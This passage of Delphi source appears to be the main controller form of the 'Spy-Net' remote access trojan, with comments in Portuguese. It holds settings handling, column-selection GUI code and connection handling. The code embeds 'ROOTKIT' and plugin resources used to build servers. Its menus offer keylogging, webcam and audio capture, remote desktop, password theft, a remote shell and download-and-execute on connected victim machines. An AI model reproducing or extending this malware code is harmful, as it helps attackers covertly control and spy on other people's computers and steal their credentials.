       (hti.Item = 4) or ((hti.Item = 5) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 4;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[5].checked = false) and
       (hti.Item = 5) or ((hti.Item = 6) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 5;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[6].checked = false) and
       (hti.Item = 6) or ((hti.Item = 7) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 6;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[7].checked = false) and
       (hti.Item = 7) or ((hti.Item = 8) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 7;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[8].checked = false) and
       (hti.Item = 8) or ((hti.Item = 9) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 8;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[9].checked = false) and
       (hti.Item = 9) or ((hti.Item = 10) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 9;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[10].checked = false) and
       (hti.Item = 10) or ((hti.Item = 11) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 10;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[11].checked = false) and
       (hti.Item = 11) or ((hti.Item = 12) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 11;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[12].checked = false) and
       (hti.Item = 12) or ((hti.Item = 13) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 12;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[13].checked = false) and
       (hti.Item = 13) or ((hti.Item = 14) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 13;
    end else

// a cada coluna nova desbloquear um bloco
// até aqui eram 13 colunas
// se der algum problema de erro ao mover o mouse, verifique se o número de colunas é o mesmo do popupmenucolunas
{
    if ((FormPrincipal.PopupMenuColunas.Items.Items[14].checked = false) and
       (hti.Item = 14) or ((hti.Item = 15) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 14;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[15].checked = false) and
       (hti.Item = 15) or ((hti.Item = 16) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 15;
    end else

}
    result := CallWindowProc(Pointer(GetWindowLong(wnd,GWL_USERDATA)), wnd, uMsg, wParam, lParam)
  end else
  result := CallWindowProc(Pointer(GetWindowLong(wnd,GWL_USERDATA)), wnd, uMsg, wParam, lParam)
end;

procedure TFormPrincipal.InicioSelecaoColunas;
var
  hwndHeader: HWND;
  i,j: Integer;
begin
  fCursor := LoadCursor(0, IDC_ARROW);
  FListViewOldWndProc := ListView1.WindowProc;
  Listview1.WindowProc := ListViewNewWndProc;
  hwndHeader := ListView_GetHeader(ListView1.Handle);
  SetWindowLong(hwndHeader, GWL_USERDATA, SetWindowLong(hwndHeader, GWL_WNDPROC, LPARAM(@NewHeaderProc)));
end;

procedure TFormPrincipal.TerminarSelecaoColunas;
var
  hwndHeader:HWND;
begin
  ListView1.WindowProc := FlistViewOldWndProc;
  FListViewOldWndProc := nil;
  hwndHeader := ListView_GetHeader(ListView1.Handle);
  SetWindowLong(hwndHeader, GWL_WNDPROC, GetWindowLong(hwndHeader, GWL_USERDATA))
end;
////// FINAL: Necessário para seleção de colunas no ListView

procedure TFormPrincipal.CarregarSettings;
var
  IniFile: TIniFile;
  i: integer;
  Bool: boolean;
begin
  IniFile := TIniFile.Create(SettingsFile);

  FormPrincipal.Left := IniFile.ReadInteger('posicao', 'formprincipal_left', 200);
  FormPrincipal.Top := IniFile.ReadInteger('posicao', 'formprincipal_top', 200);

  FormPrincipal.width := IniFile.ReadInteger('tamanho', 'formprincipal_width', 700);
  FormPrincipal.height := IniFile.ReadInteger('tamanho', 'formprincipal_height', 250);

  LastPanel1size := IniFile.ReadInteger('tamanho', 'formprincipal_panel1_width', panel1.Width);
  LastPanel2size := IniFile.ReadInteger('tamanho', 'formprincipal_panel2_width', 100);

  panel1.Width := LastPanel1size - LastPanel2size;

  Bool := IniFile.Readbool('diversos', 'formprincipal_ocultarinfo', false);
  if Ocultarinformaes1.Checked = bool then Ocultarinformaes1.Click;
  Ocultarinformaes1.Click;

  for i := 0 to listview1.Columns.Count - 1 do
  begin
    listview1.Column[i].Width := IniFile.ReadInteger('tamanho', 'formprincipal_listview1_column' + inttostr(i), 50);
    tamanhocolunas[i] := listview1.Column[i].Width;
  end;

  listview2.Column[0].Width := IniFile.ReadInteger('tamanho', 'formprincipal_listview2_column0', 120);

  for i := 0 to popupmenucolunas.Items.Count - 1 do
  begin
    if IniFile.Readbool('diversos', 'formprincipal_listview1_column' + inttostr(i) + '_visible', true) = false then
    popupmenucolunas.Items.Items[i].Click;
  end;

  languagefile := IniFile.ReadString('diversos', 'languagefile', languagefile);

  TempPorts := IniFile.ReadString('diversos', 'portas', '');

  SenhaConexao := Decode64(IniFile.ReadString('diversos', 'senhaconexao', 'OM9ZP34oCpG'));

  mostrar_tudo := IniFile.ReadBool('diversos', 'mostrar_tudo', true);
  geoip := IniFile.ReadBool('diversos', 'geoip', false);
  notificacao_visual := IniFile.ReadBool('diversos', 'notificacao_visual', false);
  notificacao_sonora := IniFile.ReadBool('diversos', 'notificacao_sonora', false);
  SoundFile := IniFile.ReadString('diversos', 'soundfile', '');
  RefreshDesktop := IniFile.ReadBool('diversos', 'atualizar_desktop', true);

  LimiteDeConexao := IniFile.ReadInteger('diversos', 'limite_conexao', 200);
  ////////
  IniFile.free;
end;

procedure TFormPrincipal.SalvarSettings;
var
  IniFile: TIniFile;
  i: integer;
begin
  IniFile := TIniFile.Create(SettingsFile);

  IniFile.WriteInteger('posicao', 'formprincipal_left', FormPrincipal.Left);
  IniFile.WriteInteger('posicao', 'formprincipal_top', FormPrincipal.Top);

  IniFile.WriteInteger('tamanho', 'formprincipal_width', FormPrincipal.width);
  IniFile.WriteInteger('tamanho', 'formprincipal_height', FormPrincipal.height);

  IniFile.WriteInteger('tamanho', 'formprincipal_panel1_width', LastPanel1size);
  IniFile.WriteInteger('tamanho', 'formprincipal_panel2_width', LastPanel2size);

  for i := 0 to listview1.Columns.Count - 1 do
  begin
    if listview1.Column[i].Width = 0 then
    IniFile.WriteInteger('tamanho', 'formprincipal_listview1_column' + inttostr(i), tamanhocolunas[i]) else
    IniFile.WriteInteger('tamanho', 'formprincipal_listview1_column' + inttostr(i), listview1.Column[i].Width);
  end;

  IniFile.WriteInteger('tamanho', 'formprincipal_listview2_column0', listview2.Column[0].Width);

  for i := 0 to popupmenucolunas.Items.Count - 1 do
  IniFile.WriteBool('diversos', 'formprincipal_listview1_column' + inttostr(i) + '_visible', popupmenucolunas.Items.Items[i].Checked);

  IniFile.WriteBool('diversos', 'formprincipal_ocultarinfo', Ocultarinformaes1.Checked);

  IniFile.WriteString('diversos', 'languagefile', languagefile);

  TempPorts := '';
  for i := 1 to 65535 do
  if PortasAtivas[i] <> 0 then TempPorts := TempPorts + '(' + inttostr(i) + ')' + ' ';
  IniFile.WriteString('diversos', 'portas', TempPorts);

  IniFile.WriteString('diversos', 'senhaconexao', Encode64(senhaconexao));
  IniFile.WriteString('diversos', 'soundfile', SoundFile);
  IniFile.WriteBool('diversos', 'geoip', geoip1.Checked);
  IniFile.WriteBool('diversos', 'mostrar_tudo', Mostrartudo1.Checked);
  IniFile.WriteBool('diversos', 'notificacao_visual', Notificaovisual1.Checked);
  IniFile.WriteBool('diversos', 'notificacao_sonora', Notificaosonora1.Checked);
  IniFile.WriteBool('diversos', 'atualizar_desktop', Atualizardesktopautomtico1.Checked);

  IniFile.WriteInteger('diversos', 'limite_conexao', LimiteDeConexao);
  IniFile.free;
end;

procedure TFormPrincipal.DefinirImagem(IL: TImageList; Codigo: integer; Image: TImage);
begin
  Image.Picture.Bitmap := nil;
  IL.GetBitmap(Codigo, Image.Picture.Bitmap);
end;

procedure TFormPrincipal.OcultarLateral;
begin
  Panel1.Width := Splitter1.Left + panel2.Width;
end;

procedure TFormPrincipal.AtualizarListviewInformacoes(IP, OS, Comp, User, AV, FW, Processador, RAM, Data: string);
var
  Item: TListItem;
begin
  ConfiguracaoDoComputador := IP + #13#10 +
                              OS + #13#10 +
                              Comp + #13#10 +
                              User + #13#10 +
                              AV + #13#10 +
                              FW + #13#10 +
                              Processador + #13#10 +
                              RAM + #13#10 +
                              Data + #13#10;

  Listview2.Items.BeginUpdate;
  Listview2.Clear;

  Item := Listview2.Items.Add;
  Item.Caption := IP;
  Item.ImageIndex := 344;

  Item := Listview2.Items.Add;
  Item.Caption := OS;
  Item.ImageIndex := 320;

  Item := Listview2.Items.Add;
  Item.Caption := Comp;
  Item.ImageIndex := 281;

  Item := Listview2.Items.Add;
  Item.Caption := User;
  Item.ImageIndex := 298;

  Item := Listview2.Items.Add;
  Item.Caption := AV;
  Item.ImageIndex := 345;

  Item := Listview2.Items.Add;
  Item.Caption := FW;
  Item.ImageIndex := 341;

  Item := Listview2.Items.Add;
  Item.Caption := Processador;
  Item.ImageIndex := 335;

  Item := Listview2.Items.Add;
  Item.Caption := RAM;
  Item.ImageIndex := 303;

  Item := Listview2.Items.Add;
  Item.Caption := Data;
  Item.ImageIndex := 268;

  Listview2.Items.EndUpdate;
end;

function TFormPrincipal.ObterInformacoes: boolean;
var
  AMsgDialog: TForm;
  ACheckBox: TCheckBox;
  Mostrar: string;
begin
  Mostrar := lerreg(HKEY_CURRENT_USER, 'Software\Spy-Net', 'ShowInfo', '');
  if Mostrar = 'No' then
  begin
    result := false;
    exit;
  end;
  if Mostrar = 'Yes' then
  begin
    result := true;
    exit;
  end;

  AMsgDialog := CreateMessageDialog(traduzidos[471], mtWarning, [mbYes, mbNo]) ;
  ACheckBox := TCheckBox.Create(AMsgDialog) ;
  with AMsgDialog do
  try
    Caption := Application.Title + ' ' + VersaoPrograma;
    Height := 170;

    with ACheckBox do
    begin
     Parent := AMsgDialog;
     Caption := traduzidos[472];
     width := 300;
     Top := 121;
     Left := 8;
    end;

    if (ShowModal = ID_YES) then // se clicar em sim...
    begin
      result := true;
      if ACheckBox.Checked then
      begin
        //do if checked
        write2reg(HKEY_CURRENT_USER, 'Software\Spy-Net', 'ShowInfo', 'Yes');
      end else
      begin
        //do if NOT checked
      end;
    end else
    begin  // se clicar em não ou fechar...
      result := false;
      if ACheckBox.Checked then
      begin
        //do if checked
        write2reg(HKEY_CURRENT_USER, 'Software\Spy-Net', 'ShowInfo', 'No');
      end else
      begin
        //do if NOT checked
      end;
    end;
    finally
    Free;
  end; 
end;

procedure TFormPrincipal.MostrarInicioTeste;
var
  s: TMemoryStream;
  j: TJpegImage;
  i: integer;
  AV, FW: string;
  b: TBitmap;
begin
  Image1.Bitmap := nil;
  s := TMemoryStream.Create;
  j := TJpegImage.Create;

  GetDesktopImage(90, 130, 130, s);
  s.Position := 0;
  j.LoadFromStream(s);

  b := tbitmap.Create;
  b.Assign(j);
  j.Free;
  Image1.Bitmap.Assign(b);
  b.Free;

  s.Free;

  i := GetCountryCode(GetCountryAbreviacao);
  Label1.Caption := GetCountryName('', i) + ' / ' + GetActiveKeyboardLanguage;
  DefinirImagem(ImageListIcons, i, Image2);

  if ObterInformacoes = true then
  begin
    GetFirewallandAntiVirusSoftware(av, fw);

    if av = '' then av := traduzidos[117];
    if fw = '' then fw := traduzidos[117];

    AtualizarListviewInformacoes(GetWanIP + ' / ' + GetLocalIP,
                                 GetOS,
                                 GetPCName,
                                 GetPCUser,
                                 av,
                                 fw,
                                 MegaTrim(GetCPU){ + ' --- ' + Format(' %f MHz', [strtofloat(GetCPUSpeed)])},
                                 'RAM: ' + BytesSize(GetRAMSize(smTotalPhys)),
                                 DateTimeToStr(now));
  end else
  begin
    AtualizarListviewInformacoes(' ',
                                 ' ',
                                 ' ',
                                 ' ',
                                 ' ',
                                 ' ',
                                 ' ',
                                 ' ',
                                 ' ');
  end;
end;

procedure TFormPrincipal.FormCreate(Sender: TObject);
var
  resStream: TResourceStream;
  Tamanho: int64;
  j: TJpegImage;
begin
  TerminouDeIncluirDS := true;
  TerminouDeIncluirWC := true;
  EnviandoPing := false;

  DebugAtivo := false;
  {$IFDEF SPYDEBUG} DebugAtivo := true; {$ENDIF}

  DebugAtivoServer := false;
  {$IFDEF SPYDEBUGSERVER} DebugAtivoServer := true; {$ENDIF}

  Label3.Caption := '0';
  Label4.Caption := '0';

  Label3.Visible := false;
  Label4.Visible := false;
  PingTest1.Visible := false;

  {$IFDEF SPYDEBUG} PingTest1.Visible := true; {$ENDIF}
  {$IFDEF SPYDEBUG} Label3.Visible := true; {$ENDIF}
  {$IFDEF SPYDEBUG} Label4.Visible := true; {$ENDIF}

  TerminouDeIncluir := true;
  TerminouPassword := true;

  MSNPopUp1.Width := MSNPopUp1.IconBitmap.Width + 24;
  MSNPopUp1.Height := MSNPopUp1.IconBitmap.Height + 10;
  MSNPopUp1.Title := '';
  MSNPopUp1.URL := '';
  MSNPopUp1.TextAlignment := taLeftJustify;

  Application.OnMinimize := AppMinMessage;
  CoolTrayIcon1.IconVisible := false;

  j := TJpegImage.Create;
  ImageStream := TmemoryStream.Create;

  resStream := TResourceStream.Create(hInstance, 'IMAGE', 'imagefile');
  j.LoadFromStream(resStream);
  resStream.Free;
  j.SaveToStream(ImageStream);
  ImageStream.Position := 0;
  j.Free;

  resStream := TResourceStream.Create(hInstance, 'FUNCOES', 'funcoesfile');
  PluginBuffer:= FormCreateServer.StreamToString(resStream, tamanho);
  resStream.Free;

  resStream := TResourceStream.Create(hInstance, 'ROOTKIT', 'RootKITfile');
  RootKITBuffer:= FormCreateServer.StreamToString(resStream, tamanho);
  resStream.Free;

  resStream := TResourceStream.Create(hInstance, 'SQLITE3', 'sqlite3file');
  resStream.SaveToFile(ExtractFilePath(paramstr(0)) + 'sqlite3.dll');
  resStream.Free;

  MD5plugin := MD5Print(MD5String(PluginBuffer));

  SettingsFile := ExtractFilePath(paramstr(0)) + 'Settings' + '\' + 'Settings.ini';
  IconFolder := ExtractFilePath(paramstr(0)) + 'Icons' + '\';
  ProfilesFolder := ExtractFilePath(paramstr(0)) + 'Profiles' + '\';

  Application.HintPause := 100;
  CanResizeLateral := true;
  conn := Tlist.Create;
  ConfigsList := TstringList.Create;
  InicioSelecaoColunas;
end;

procedure TFormPrincipal.ChangeListViewLineColor(Item: TListItem; Color: TColor);
var
  DefaultDraw: boolean;
  CustomDrawState: TCustomDrawState;
  ConAux: PConexao;
begin
  ConAux := PConexao(Item.Data);
  ConAux.LineColor := Color;
  ListView1CustomDrawItem(Listview1, Item, CustomDrawState, DefaultDraw);
end;

procedure TFormPrincipal.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
var
  ConAux: PConexao;
begin
  try
    if Item.Data <> nil then
    begin
      ConAux := PConexao(Item.Data);
      try
        Sender.Canvas.Font.Color := ConAux.LineColor;
        except
        {$IFDEF SPYDEBUG} AddDebug(Erro10); {$ENDIF}
        Sender.Canvas.Font.Color := ClBlack;
      end;  
    end else
    except
    {$IFDEF SPYDEBUG} AddDebug(Erro11); {$ENDIF}
  end;
end;

procedure TFormPrincipal.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  i: integer;
begin
  for i := (Conn.Count - 1) downto 0 do try PConexao(conn[i]).Athread.Connection.Disconnect except end;
  MSNPopup1.ClosePopUps;
  ImageStream.Free;
  conn.Free;
  ConfigsList.Free;
  TerminarSelecaoColunas;


  // depois que finalizar tudo, estava dando problema com o componente de popup
  // então eu coloquei exitprocess(0)
  exitprocess(0);
end;

procedure TFormPrincipal.Ocultarinformaes1Click(Sender: TObject);
begin
  Ocultarinformaes1.Checked := not Ocultarinformaes1.Checked;
  if Ocultarinformaes1.Checked = true then
  begin
    OcultarLateral;
    CanResizeLateral := false;
    Splitter1.Cursor := crDefault;
  end else
  begin
    CanResizeLateral := true;
    Splitter1.Cursor := crHSplit;
    panel1.Width := panel1.Width - LastPanel2size;
  end;
end;

procedure TFormPrincipal.Splitter1CanResize(Sender: TObject;
  var NewSize: Integer; var Accept: Boolean);
begin
  Accept := CanResizeLateral;
end;

procedure TFormPrincipal.NomedoServidor1Click(Sender: TObject);
var
  MenuItem: TMenuItem;
begin
  MenuItem := TMenuItem(sender);

  MenuItem.Checked := not MenuItem.Checked;
  if MenuItem.Checked = false then
  begin
    TamanhoColunas[MenuItem.MenuIndex] := ListView1.Columns[MenuItem.MenuIndex].Width;
    ListView1.Columns[MenuItem.MenuIndex].Width := 0;
    ListView1.Columns[MenuItem.MenuIndex].MaxWidth := 1;
  end else
  begin
    ListView1.Columns[MenuItem.MenuIndex].MaxWidth := 0;
    ListView1.Columns[MenuItem.MenuIndex].Width := TamanhoColunas[MenuItem.MenuIndex];
  end;
end;

procedure TFormPrincipal.ListView1ColumnRightClick(Sender: TObject;
  Column: TListColumn; Point: TPoint);
begin
  ListView1.PopupMenu := PopupMenuColunas;
end;

procedure TFormPrincipal.PopupMenuColunasPopup(Sender: TObject);
begin
  ListView1.PopupMenu := PopupMenuFuncoes;
end;

procedure TFormPrincipal.FormShow(Sender: TObject);
var
  resStream: TResourceStream;
  Tamanho: Integer;
begin
  if fileexists(SettingsFile) = false then
  begin
    ForceDirectories(ExtractFilePath(SettingsFile));
    resStream := TResourceStream.Create(hInstance, 'SETTINGS', 'settingsfile');
    resStream.SaveToFile(SettingsFile);
    resStream.Free;
  end;

  StartPreventResize;
  CarregarSettings;

  Notificaovisual1.Checked := Notificacao_visual;
  Notificaosonora1.Checked := Notificacao_sonora;
  Mostrartudo1.Checked := mostrar_tudo;
  geoip1.checked := geoip;
  Atualizardesktopautomtico1.Checked := RefreshDesktop;
  timer3.Enabled := RefreshDesktop;

  if fileexists(languagefile) = false then
  begin
    languagefile := ExtractFilePath(paramstr(0)) + 'Language' + '\' + 'Default.ini';
    ForceDirectories(ExtractFilePath(languagefile));
    resStream := TResourceStream.Create(hInstance, 'SETTINGS2', 'languagefile');
    resStream.SaveToFile(languagefile);
    resStream.Free;
  end;

  LerStrings(languagefile);
  AtualizarStringsTraduzidas;

  MostrarInicioTeste;

  Arquivo1.Enabled := false;
  Opes1.Enabled := false;

  Caption := Application.Title + ' ' + VersaoPrograma;
end;

procedure TFormPrincipal.AtualizarStringsTraduzidas;
begin
  Pas1.Caption := traduzidos[1];
  NomedoServidor1.Caption := traduzidos[2];
  WANLAN1.Caption := traduzidos[3];
  ComputadorUsurio1.Caption := traduzidos[4];
  CAM1.Caption := traduzidos[5];
  SistemaOperacional1.Caption := traduzidos[6];
  CPU1.Caption := traduzidos[7];
  RAM1.Caption := traduzidos[8];
  Antivrus1.Caption := traduzidos[9];
  Firewall1.Caption := traduzidos[10];
  Verso1.Caption := traduzidos[11];
  Porta1.Caption := traduzidos[26];
  PingmsIdle1.Caption := traduzidos[12];
  Janelaativa1.Caption := traduzidos[13];

  listview1.Column[0].Caption := Pas1.Caption;
  listview1.Column[1].Caption := NomedoServidor1.Caption;
  listview1.Column[2].Caption := WANLAN1.Caption;
  listview1.Column[3].Caption := ComputadorUsurio1.Caption;
  listview1.Column[4].Caption := CAM1.Caption;
  listview1.Column[5].Caption := SistemaOperacional1.Caption;
  listview1.Column[6].Caption := CPU1.Caption;
  listview1.Column[7].Caption := RAM1.Caption;
  listview1.Column[8].Caption := Antivrus1.Caption;
  listview1.Column[9].Caption := Firewall1.Caption;
  listview1.Column[10].Caption := Verso1.Caption;
  listview1.Column[11].Caption := Porta1.Caption;
  listview1.Column[12].Caption := PingmsIdle1.Caption;
  listview1.Column[13].Caption := Janelaativa1.Caption;

  Statusbar1.Panels.Items[0].Text := traduzidos[18] + ': ' + inttostr(listview1.Items.Count);
  Statusbar1.Panels.Items[1].Text := traduzidos[19] + ': -//-';
  label2.Caption := traduzidos[14];
  listview2.Column[0].Caption := traduzidos[16];
  Arquivo1.Caption := traduzidos[20];
  Sair1.Caption := traduzidos[22];
  Opes1.Caption := traduzidos[21];
  Ocultarinformaes1.Caption := traduzidos[23];
  Image1.Hint := traduzidos[17];
  Selecionarportas1.Caption := traduzidos[29];
  Novoservidor1.Caption := traduzidos[41];
  MostrarTudo1.Caption := traduzidos[486];
  Selecionarsomdenotificao1.Caption := traduzidos[516];
  GeoIP1.Caption := traduzidos[487];

  Mostrar1.Caption := traduzidos[121];
  Sair2.Caption := traduzidos[22];
  Reconnect1.Caption := traduzidos[122];
  Disconnect1.Caption := traduzidos[125];
  Uninstall1.Caption := traduzidos[127];
  Rename1.Caption := traduzidos[129];
  UpdateServer1.Caption := traduzidos[131];
  Notificaosonora1.Caption := traduzidos[132];
  Notificaovisual1.Caption := traduzidos[136];
  Listadeprocessos1.Caption := traduzidos[160];
  Listadeservios1.Caption := traduzidos[180];
  Listadejanelas1.Caption := traduzidos[198];
  Listarportasativas1.Caption := traduzidos[228];
  ListarDispositivos1.Caption := traduzidos[233];
  Executarcomandos1.Caption := traduzidos[241];
  Abrirpginadainternet1.Caption := traduzidos[243];
  Baixararquivoeexecutar1.Caption := traduzidos[245];
  Start1.Caption := traduzidos[145];
  Stop1.Caption := traduzidos[146];
  PromptDOS1.Caption := traduzidos[255];
  Regedit1.Caption := traduzidos[271];
  Keylogger1.Caption := traduzidos[39];
  DesktopRemoto1.Caption := traduzidos[286];
  webcam1.Caption := traduzidos[291];
  Senhas1.Caption := traduzidos[353];
  Gerenciararquivos1.Caption := traduzidos[306];
  Capturadeaudio1.Caption := traduzidos[292];
  Listadeprogramasinstalados1.Caption := traduzidos[140];
  Selecionaridioma1.Caption := traduzidos[398];
  Arquivolocal1.Caption := traduzidos[399];
  Downloaddainternet1.Caption := traduzidos[400];
  Visualizarlogsdeemail1.Caption := traduzidos[468];
  Atualizardesktopautomtico1.Caption := traduzidos[470];

  Procurarnoservidor1.Caption := traduzidos[403];
  Palavraskeylogger1.Caption := traduzidos[404];
  Arquivos1.Caption := traduzidos[401];
  Sobre1.Caption := traduzidos[409];
  Opesextras1.Caption := traduzidos[459];
  Download1.Caption := traduzidos[389];





  SendFileExecute1.Caption := traduzidos[133];
  Hidden1.Caption := traduzidos[134];
  Normal1.Caption := traduzidos[135];
end;

procedure TFormPrincipal.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  //verificar se pode fechar



  Ocultarinformaes1.Click;
  Ocultarinformaes1.Click;
  SalvarSettings;
  StopPreventResize;
end;

procedure TFormPrincipal.IdTCPServer1Disconnect(AThread: TIdPeerThread);
var
  ConAux: PConexao;
begin
  if AThread.Data = nil then exit;
  ConAux := PConexao(AThread.Data);

  if ConAux.Forms[0] <> nil then try (ConAux.Forms[0] as TFormFuncoesDiversas).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[1] <> nil then try (ConAux.Forms[1] as TFormListarDispositivos).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[2] <> nil then try (ConAux.Forms[2] as TFormShell).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[3] <> nil then try (ConAux.Forms[3] as TFormRegistry).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[4] <> nil then try (ConAux.Forms[4] as TFormKeylogger).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[5] <> nil then try (ConAux.Forms[5] as TFormDesktop).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[6] <> nil then try (ConAux.Forms[6] as TFormWebcam).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[7] <> nil then try (ConAux.Forms[7] as TFormAudio).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[8] <> nil then try (ConAux.Forms[8] as TFormFileManager).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;
  if ConAux.Forms[9] <> nil then try (ConAux.Forms[9] as TFormOpcoesExtras).Close; except {$IFDEF SPYDEBUG} AddDebug(Erro1) {$ENDIF} end;

  // verificar se vai dar algum erro
  // pode ser que seja devido ao Item.data quando for deletar a linha do listview
  // tentar deixar o item.data do listview sem usar, ou seja, arrumar outra forma de identificar a conexão
  // a ordem dos dois últimos está certa freemem(ConAux) e data := nil
  try
    conn.Remove(ConAux);
    except
   {$IFDEF SPYDEBUG} AddDebug(Erro13); {$ENDIF}
  end;
  try
    while TerminouDeIncluir = false do
    begin
      sleep(2);
      application.processmessages;
    end;
    TerminouDeIncluir := false;
    if ConAux.Item <> nil then
    begin
      Listview1.Items.BeginUpdate;
      ConAux.Item.Delete;
      Listview1.Items.EndUpdate;
    end;
    except
   {$IFDEF SPYDEBUG} AddDebug(Erro14); {$ENDIF}
  end;

  try
    Freemem(ConAux);
    except
   {$IFDEF SPYDEBUG} AddDebug(Erro15); {$ENDIF}
  end;
  try
    AThread.Data := nil;
    except
   {$IFDEF SPYDEBUG} AddDebug(Erro16); {$ENDIF}
  end;
  sleep(5);
  TerminouDeIncluir := true;
  
  ///////////////////////////////////
  Statusbar1.Panels.Items[0].Text := traduzidos[18] + ': ' + inttostr(listview1.Items.Count);
end;

function MSecToTime(mSec: Int64): string;
var
  dt : TDateTime;
begin
   dt := mSec / MSecsPerSec / SecsPerDay;
   //Result := Format('%d days, %s', [Trunc(dt), FormatDateTime('hh:nn:ss.z', Frac(dt))]);

   // a pedido de muitos usuários
   Result := Format('%d days, %s', [Trunc(dt), FormatDateTime('hh:nn:ss', Frac(dt))]);
   Result := replacestring('0 days, ', '', result);
end;

procedure ExecutarSom;
var
  resStream: TResourceStream;
begin
  if fileexists(FormPrincipal.SoundFile) = true then
  try
    PlaySound(pchar(FormPrincipal.SoundFile), 0, SND_ASYNC);
    except
   {$IFDEF SPYDEBUG} AddDebug(Erro17); {$ENDIF}
    deletefile(FormPrincipal.SoundFile);
  end else
  begin
    FormPrincipal.SoundFile := ExtractFilePath(paramstr(0)) + 'sound.wav';
    resStream := TResourceStream.Create(hInstance, 'SOUND', 'soundfile');
    resStream.SaveToFile(FormPrincipal.SoundFile);
    resStream.Free;
    try
      PlaySound(pchar(FormPrincipal.SoundFile), 0, SND_ASYNC);
      except
      {$IFDEF SPYDEBUG} AddDebug(Erro18); {$ENDIF}
      deletefile(FormPrincipal.SoundFile);
    end;
  end;
end;

procedure TFormPrincipal.ReceberComando(AThread, AThreadTransfer: TIdPeerThread; Recebido: string; Hora_Ping: cardinal);
type
  ServerINFO = record
    Identificacao: shortString;
    LocalAddress: shortString;
    PcName_PcUser: shortString;
    Webcam: shortString;
    GetOS: shortString;
    GetCPU: shortString;
    RAMSize: shortString;
    AntiVirus: shortString;
    Firewall: shortString;
    Versao: shortString;
    RemotePort: shortString;
    Ping: shortString;
    ActiveCaption: shortString;
    Flag: shortString;
    Bandeira: shortString;
    FirstExecution: shortString;
  end;

var
  Informacoes: ServerINFO;

  Tempstr, Tempstr1: string;
  Ping_time: cardinal;
  ConAux: PConexao;
  Dados: array [0..13] of string;
  i: integer;
  Item: TListItem;
  S: TMemoryStream;
  j: TJpegImage;
  b: TBitmap;
  c: cardinal;
  ThreadId: cardinal;
  ThreadEnviarArquivo: TThreadEnviarArquivo;
  TextoPopup: string;
  resStream: TResourceStream;
  BandeiraBKP: string;
  FirstExecution: shortString;
begin
  ConAux := nil;
  ConAux := PConexao(Athread.Data);

  if copy(recebido, 1, pos('|', recebido) - 1) = PONGTEST then
  begin
    delete(recebido, 1, pos('|', recebido));
    Label3.Caption := inttostr(strtoint(label3.Caption) + 1);
    Label4.Caption := inttostr(length(recebido));
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = PONG then
  begin
    ping_time := Hora_Ping - ConAux.Ping;

    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    TempStr := trim(TempStr);
    if pos('###', tempstr) >= 1 then
    begin
      Tempstr1 := TempStr;
      TempStr := copy(tempstr1, 1, pos('###', tempstr1) - 1);
      delete(Tempstr1, 1, pos('###', tempstr1) + 2);
    end;
    if tempstr1 <> '' then
    begin
      try
        ConAux.item.SubItems[11] := IntToStr(ping_time) + ' / ' + MSecToTime(strtoint64(tempstr1));
        except
        {$IFDEF SPYDEBUG} AddDebug(Erro19); {$ENDIF}
        ConAux.item.SubItems[11] := IntToStr(ping_time);
      end;
    end else
    ConAux.item.SubItems[11] := IntToStr(ping_time);

    ConAux.item.SubItems[12] := TempStr;
    ChangeListViewLineColor(ConAux.item, ClBlack);

    if ping_time <= 200 then ConAux.item.SubItemImages[0] := 326 else
    if (ping_time > 200) and (ping_time <= 500) then ConAux.item.SubItemImages[0] := 327 else
    if ping_time > 500 then ConAux.item.SubItemImages[0] := 328;

    Exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = UPDATESERVERERROR then
  begin
